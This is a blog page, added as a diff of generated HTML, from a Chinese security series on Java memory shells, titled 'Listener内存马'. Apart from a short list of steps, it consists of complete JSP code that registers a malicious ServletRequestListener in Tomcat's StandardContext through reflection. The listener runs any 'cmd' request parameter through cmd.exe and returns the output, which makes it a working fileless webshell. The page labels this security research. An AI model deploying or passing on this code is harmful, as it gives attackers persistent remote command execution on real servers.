@@ -1,0 +1,85 @@
+<!doctype html><html lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Listener内存马 | 1ux4ry Archive</title><meta name=description content="Java 内存马 作为一种无文件落地的木马，研究很有必要"><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700;800&family=Space+Grotesk:wght@400;500;700&display=swap" rel=stylesheet><link rel=stylesheet href=/css/main.css></head><body><div class=site-bg></div><div class=site-shell><header class=topbar><a class=brand href=/><span>1ux4ry Archive</span></a><nav class=main-nav aria-label=主导航><a href=/>合集</a>
+<a href=/posts/>归档</a>
+<a href=/categories/>分类</a>
+<a href=/tags/>标签</a>
+<a href=/about/>关于</a>
+<a href=/friends/>友链</a>
+<a href=https://github.com/luxuryzcx>GitHub</a></nav></header><section class="page-block article-layout article-layout--with-toc"><aside class=article-toc aria-label=文章大纲><div class=article-toc__inner><p class=article-toc__kicker>ON THIS PAGE</p><div class=article-toc__content><nav id=TableOfContents><ul><li><a href=#前置条件>前置条件</a></li><li><a href=#完整代码>完整代码</a></li><li><a href=#运行示例>运行示例</a></li></ul></nav></div></div></aside><article class=article-single><section class=article-hero-card aria-label=Listener内存马><div class="article-hero-card__glow article-hero-card__glow--cyan"></div><div class="article-hero-card__glow article-hero-card__glow--pink"></div><div class="article-hero-card__glow article-hero-card__glow--amber"></div><p class=article-hero-card__command>1ux4ry@archive:~# ./JAVA内存马基础系列</p><div class=article-hero-card__title><span class=article-hero-card__title-main>Java内存马基础系列</span>
+<span class=article-hero-card__title-sub>Listener内存马</span></div><p class=article-hero-card__meta>Java内存马 / Java内存马基础系列 / 1ux4ry Archive</p><p class=article-hero-card__desc>Java 内存马 作为一种无文件落地的木马，研究很有必要</p></section><header class=page-head><p class=page-kicker>ARTICLE</p><p class=article-series>Java内存马基础系列</p><h1>Listener内存马</h1><div class=single-meta><span>2026-06-15</span>
+<span>Java内存马</span>
+<span># 安全研究</span></div></header><div class="page-copy content-body"><h1 id=前置条件>前置条件</h1><p>如果我们想要写一个<code>Listener</code>内存马，需要经过以下步骤：</p><ul><li>继承并编写一个恶意<code>Listener</code></li><li>获取<code>StandardContext</code></li><li>调用<code>StandardContext.addApplicationEventListener()</code>添加恶意<code>Listener</code></li></ul><h1 id=完整代码>完整代码</h1><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&lt;%@ page import=&#34;org.apache.catalina.connector.Request&#34; %&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&lt;%@ page import=&#34;java.io.InputStream&#34; %&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&lt;%@ page import=&#34;java.util.Scanner&#34; %&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&lt;%!
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    public class EvilListener implements ServletRequestListener {
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        public void requestDestroyed(ServletRequestEvent sre) {
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            if (req.getParameter(&#34;cmd&#34;) != null){
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                InputStream in = null;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                try {
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    in = Runtime.getRuntime().exec(new String[]{&#34;cmd.exe&#34;,&#34;/c&#34;,req.getParameter(&#34;cmd&#34;)}).getInputStream();
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    Scanner s = new Scanner(in, &#34;GBK&#34;).useDelimiter(&#34;\\A&#34;);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    String out = s.hasNext()?s.next():&#34;&#34;;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    Field requestF = req.getClass().getDeclaredField(&#34;request&#34;);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    requestF.setAccessible(true);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    Request request = (Request)requestF.get(req);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    request.getResponse().setCharacterEncoding(&#34;GBK&#34;);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    request.getResponse().getWriter().write(out);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                catch (Exception ignored) {}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        public void requestInitialized(ServletRequestEvent sre) {}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>%&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&lt;%
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    Field reqF = request.getClass().getDeclaredField(&#34;request&#34;);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    reqF.setAccessible(true);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    Request req = (Request) reqF.get(request);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    StandardContext context = (StandardContext) req.getContext();
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    EvilListener evilListener = new EvilListener();
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    context.addApplicationEventListener(evilListener);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    out.println(&#34;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Inject Listener Memory Shell successfully!&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Shell url: http://localhost:8080/servlet/?cmd=ipconfig&#34;);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>%&gt;
+</span></span></code></pre></div><h1 id=运行示例>运行示例</h1><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260518110215227.png alt=image.png loading=lazy decoding=async></figure></p></div><div class=single-tags><a href=/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/># 安全研究</a></div></article></section><footer class=footer><p>© 2026 1ux4ry</p><p>Built with Hugo. Layout inspired by a minimalist blog feed, restyled for your own voice.</p></footer></div><script src=/js/main.js></script></body></html>
